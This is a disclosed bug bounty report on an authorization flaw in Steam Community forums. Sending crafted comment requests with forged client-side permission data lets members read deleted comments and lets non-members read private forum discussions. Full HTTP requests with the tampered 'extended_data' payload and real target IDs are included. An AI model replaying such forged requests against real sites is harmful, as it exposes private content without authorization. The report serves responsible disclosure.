# Read Access to all comments on unauthorized forums' discussions! IDOR! 

## Report Details
- **Report ID**: 308610
- **URL**: https://hackerone.com/reports/308610
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-01-24T11:10:24.862Z
- **Disclosed**: 2018-05-09T17:38:52.389Z

## Reporter
- **Username**: ta8ahi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: valve

## Vulnerability Information
hi,

For a forum's discussion, only ` moderator+ ` ranks are allowed to **view comments which have been deleted** by a ` officer/moderator `. 

I have found an issue where a ` member `(who is not allowed to view deleted comments) can get read access to the deleted comments on a forum's discussion.

Also, a ` non-member ` who ` can't view the discussions belonging to an unauthorized forum `, can **expose the comments** on discussions of such forums. He can get read access to all i.e ` even deleted ` comments on such forums.


##Steps to reproduce:
###First we try to expose deleted comments to a member rank user

* Have a forum with such permissions:
{F256910}
So, here ` members ` can view the discussions belonging to this forum, but aren't allowed to view any deleted comments.

Also, ` non-members ` **can't even view the discussions.**
* In the forum, have a discussion, which has some comments, and delete a few of them.

* From ` member ` account, visit the target discussion, ` view-source ` of the page, search for ` forumtopic_ ` where you will find the **GroupId**, **forumId**, **discussion-id** in ` ForumTopic_***GroupID***_***forumID***_***discussionID***  `  format. Note these down.
* now, with credentials (` cookies/sessionId `) belonging to a ` member ` account, make the following request:

```
POST /comment/ForumTopic/delete/***GroupID***/***forumID***/ HTTP/1.1
Host: steamcommunity.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/javascript, text/html, application/xml, text/xml, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-Prototype-Version: 1.7
Content-Length: 597
Cookie: ***********member-cookies****
Connection: close

gidcomment=00000&comment=boom...x&start=0&count=15&sessionid=***************&extended_data=%7B%22topic_permissions%22%3A%7B%22can_view%22%3A1%2C%22can_post%22%3A0%2C%22can_reply%22%3A0%2C%22can_moderate%22%3A1%2C%22can_edit_others_posts%22%3A1%2C%22can_purge_topics%22%3A1%2C%22is_banned%22%3A0%2C%22can_delete%22%3A1%2C%22can_edit%22%3A1%7D%2C%22original_poster%22%3A0%2C%22topic_gidanswer%22%3A%220%22%2C%22forum_appid%22%3A0%2C%22forum_public%22%3A0%2C%22forum_type%22%3A%22General%22%2C%22forum_gidfeature%22%3A%220%22%7D&feature2=***discussionID***&oldestfirst=true&include_raw=true



```

Provide the IDs you noted down as stated in the request. Keep the ` extended_data ` param as it is.

* send the request through
* in the response search for ` comments_raw `, you will see that even the deleted comments were shown to you.


###now Lets attempt to expose comments to a user who is not allowed to view the forum

* Now, with credentials (` cookies/sessionId `) belonging to a ` non-member ` account, make the following request:

```
POST /comment/ForumTopic/delete/***GroupID***/***forumID***/ HTTP/1.1
Host: steamcommunity.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/javascript, text/html, application/xml, text/xml, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-Prototype-Version: 1.7
Content-Length: 597
Cookie: ***********member-cookies****
Connection: close

gidcomment=00000&comment=boom...x&start=0&count=15&sessionid=***************&extended_data=%7B%22topic_permissions%22%3A%7B%22can_view%22%3A1%2C%22can_post%22%3A0%2C%22can_reply%22%3A0%2C%22can_moderate%22%3A1%2C%22can_edit_others_posts%22%3A1%2C%22can_purge_topics%22%3A1%2C%22is_banned%22%3A0%2C%22can_delete%22%3A1%2C%22can_edit%22%3A1%7D%2C%22original_poster%22%3A0%2C%22topic_gidanswer%22%3A%220%22%2C%22forum_appid%22%3A0%2C%22forum_public%22%3A0%2C%22forum_type%22%3A%22General%22%2C%22forum_gidfeature%22%3A%220%22%7D&feature2=***discussionID***&oldestfirst=true&include_raw=true

```
Provide the same IDs as in the previous request. Or you can try with ` ForumTopic_103582791461362746_1692659135923574526_1692659769940104935 `, these IDs belong to a **Group-->forum** which has view permissions set to ` members-only `.

In response, search for ` comments_raw  `, you will see all comments were exposed to a user who ` does not even have the permission to view this discussion `.

## Impact

* ` Non-members ` without having the access to ` view a forum ` can get **read access** to all comments including deleted comments on such forum discussions. 
* ` Members ` get **read access** to ` deleted comments ` on forum discussions.

All these attacks require no user interaction, i.e attacker can ex-filtrate these on his own machine.


thanks,
Tabahi

## Attachments
- initialPermissions.PNG
